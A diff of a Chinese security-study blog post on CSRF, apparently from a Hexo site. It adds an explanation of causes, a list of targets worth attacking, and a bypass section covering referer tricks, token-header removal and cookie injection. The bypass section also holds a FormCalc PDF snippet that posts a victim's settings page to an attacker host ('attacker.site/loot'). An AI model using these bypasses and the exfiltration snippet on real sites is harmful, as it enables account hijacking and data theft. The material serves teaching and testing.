@@ -100,12 +100,12 @@ Yume Shoka = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
         </ul>
       </div>
     </header>
@@ -179,8 +179,15 @@ Yume Shoka = Hexo</title>
 –对敏感信息的操作增加安全的验证码；<br>
 –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
 </blockquote>
-<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作。</p>
-<p>没有对用户合法身份进行验证</p>
+<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作，没有对用户合法身份进行验证</p>
+<p>官方术语说：攻击能劫持终端用户在已登录的 Web 站点上执行本意操作，会自动携带同一域名下的 cookie 到服务器，简单的说攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF 的过程非常隐秘受害人甚至无法察觉。</p>
+<p>产生 CSRF 漏洞的原因大致有以下:</p>
+<ul>
+<li>一方面是开发者不够谨慎，编写的 Web 应用程序存在漏洞导致恶意利用；</li>
+<li>另一方面因为 Web 浏览器对于 Cookie 和 HTTP 身份验证的回话信息的处理存在一定的缺陷；</li>
+<li>服务器对于浏览器过于信任，相信从该浏览器发出的请求都是正确的，却没有区分这是用户主动发送的请求，还是模拟用户行为发出来的。</li>
+</ul>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221118090340493.png" alt="image-20221118090340493"></p>
 <h2 id="csrf类型"><a class="markdownIt-Anchor" href="#csrf类型">#</a> CSRF 类型</h2>
 <p><strong>GET 类型的 CSRF</strong></p>
 <p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>
@@ -193,6 +200,14 @@ Yume Shoka = Hexo</title>
 <p><strong>链接类型的 CSRF</strong></p>
 <p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
 <p><code> &lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;   重磅消息！！   &lt;a/&gt;</code></p>
+<h4 id="csrf漏洞利用"><a class="markdownIt-Anchor" href="#csrf漏洞利用">#</a> CSRF 漏洞利用</h4>
+<p>描述：CSRF 的利用点找寻 <code>订单下单处 修改敏感信息处 删除信息处 绑定处 发送信息处</code> ；CSRF 利用场景:</p>
+<ul>
+<li>获取个人数据（常常使用）</li>
+<li>修改个人数据（横向越权）</li>
+<li>添加用户（纵向越权）等</li>
+</ul>
+<p>电商用户新增默认收货地址、发微博、添加管理员等等，所有的敏感操作都可以是我们的攻击目标，发现的用户账号授权相关的操作、二维码登陆、绑定第三方账号等，这些功能有 CSRF 的话就直接被盗号了，也就是说所有的敏感操作都需要进行 CSRF 的防护。</p>
 <h2 id="dvwa"><a class="markdownIt-Anchor" href="#dvwa">#</a> dvwa</h2>
 <p>1.low</p>
 <p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png" alt="image-20221029213100094"></p>
@@ -257,6 +272,20 @@ Yume Shoka = Hexo</title>
 <li>Samesite Cookie</li>
 </ul>
 <p>4. 修改密码时需要原密码</p>
+<h2 id="csrf绕过"><a class="markdownIt-Anchor" href="#csrf绕过">#</a> CSRF 绕过</h2>
+<p>1.referer 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.置空：删除referer内容</span><br><span class="line">2.子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 https://baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了</span><br><span class="line">3.修改域名：https://adafsec.weiyigeek.org https://0dafsec.weiyigeek.org https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法</span><br><span class="line">4.参数： https://weiyigeek.org/?https://dafsec.org</span><br></pre></td></tr></table></figure>
+<p>2. 删除 X-CSRFToken 报头然后将 POST 请求改为 GET</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用POST和删除“X-CSRFToken”报头测试成功-构造PoC以GET请求来修改邮箱-成功CSRF攻击后利用修改后邮箱重置密码</span><br></pre></td></tr></table></figure>
+<p>3.Use Bad PDF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FormCalc的get()和post()方法允许过滤CSRF-token,其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token </span><br><span class="line">&lt;script contentType=&#x27;application/x-formcalc&#x27;&gt;</span><br><span class="line">  var content = GET(&quot;https://example.com/Settings.action&quot;); </span><br><span class="line">  Post(&quot;http://attacker.site/loot&quot;,content,&quot;text/plain&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>旁路 cookie 注入绕过</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">描述:攻击者可以通过cookie注入绕过双重提交cookie保护 cookie注入的方法:</span><br><span class="line"></span><br><span class="line">- CRLF-injection (HTML响应拆分注入漏洞)</span><br><span class="line">- Browser bugs (like CVE-2016-9078 in Firefox)</span><br></pre></td></tr></table></figure>
+<p>5.Content-Type 绕过方法</p>
+<p>描述：该类漏洞主要是利用的程序后端没有验证 (Calidate) <code>Content-Type</code>  头；攻击者只能通过 HTML 表单或 XHR api 发送 “简单” 的内容类型:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* text/plain</span><br><span class="line">* application/x-www-form-urlencoded</span><br><span class="line">* multipart/form-dat</span><br></pre></td></tr></table></figure>
 <h2 id="xss-csrf"><a class="markdownIt-Anchor" href="#xss-csrf">#</a> xss + csrf</h2>
 <p>selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。</p>
 <h4 id="stored-xss-csrf"><a class="markdownIt-Anchor" href="#stored-xss-csrf">#</a> stored xss + csrf</h4>
@@ -285,7 +314,7 @@ Yume Shoka = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-10-30 14:21:39" itemprop="dateModified" datetime="2022-10-30T14:21:39+08:00">2022-10-30</time>
+    <time title="Modified: 2022-11-18 09:17:02" itemprop="dateModified" datetime="2022-11-18T09:17:02+08:00">2022-11-18</time>
   </span>
 </div>
 
@@ -340,7 +369,7 @@ Yume Shoka = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/05/27/emergency%20response/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclwuom7cj20zk0m8dvn.jpg" title="应急响应">
+  <a href="/2022/05/27/emergency%20response/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetv6p75j20zk0m8x6p.jpg" title="应急响应">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> 内网</span>
   <h3>应急响应</h3>
@@ -350,7 +379,7 @@ Yume Shoka = Hexo</title>
     <div class="item right">
       
 
-  <a href="/2022/06/27/SSRF/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfdu6exj20zk0m87hw.jpg" title="SSRF">
+  <a href="/2022/06/27/SSRF/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="SSRF">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> web安全</span>
   <h3>SSRF</h3>
@@ -372,11 +401,11 @@ Yume Shoka = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf"><span class="toc-number">1.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> CSRF 类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa"><span class="toc-number">1.2.</span> <span class="toc-text"> dvwa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-tester"><span class="toc-number">1.3.</span> <span class="toc-text"> CSRF tester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text"> CSRF 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-csrf"><span class="toc-number">1.5.</span> <span class="toc-text"> xss + csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss-csrf"><span class="toc-number">1.5.0.1.</span> <span class="toc-text"> stored xss + csrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#self-xss-csrf"><span class="toc-number">1.5.0.2.</span> <span class="toc-text"> self-xss + csrf</span></a></li></ol></li></ol></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf"><span class="toc-number">1.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> CSRF 类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.0.1.</span> <span class="toc-text"> CSRF 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa"><span class="toc-number">1.2.</span> <span class="toc-text"> dvwa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-tester"><span class="toc-number">1.3.</span> <span class="toc-text"> CSRF tester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text"> CSRF 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text"> CSRF 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-csrf"><span class="toc-number">1.6.</span> <span class="toc-text"> xss + csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss-csrf"><span class="toc-number">1.6.0.1.</span> <span class="toc-text"> stored xss + csrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#self-xss-csrf"><span class="toc-number">1.6.0.2.</span> <span class="toc-text"> self-xss + csrf</span></a></li></ol></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
         <ul>
-          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li class="active"><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="反序列化">反序列化</a></li>
+          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li class="active"><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/11/27/CDN/" rel="bookmark" title="CDN&DNS">CDN&DNS</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="Overview">
@@ -390,7 +419,7 @@ Yume Shoka = Hexo</title>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">14</span>
+        <span class="count">15</span>
         <span class="name">posts</span>
       </a>
     </div>
@@ -457,6 +486,16 @@ Yume Shoka = Hexo</title>
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
+    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
     <span><a href="/2022/06/27/SSRF/" title="SSRF">SSRF</a></span>
   </li>
 
@@ -467,65 +506,7 @@ Yume Shoka = Hexo</title>
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
-</div>
-
-    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
-</div>
-
-    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
-</div>
-
-    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
-</div>
-
-    <span><a href="/2022/11/01/reverse/" title="逆向">逆向</a></span>
+    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
   </li>
 
       
@@ -542,10 +523,59 @@ Yume Shoka = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/27/CDN/" title="CDN&amp;DNS">CDN&DNS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
 </div>
 
     <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/08/16/Unserialize/" title="unserialize">unserialize</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
   </li>
 
   </ul>
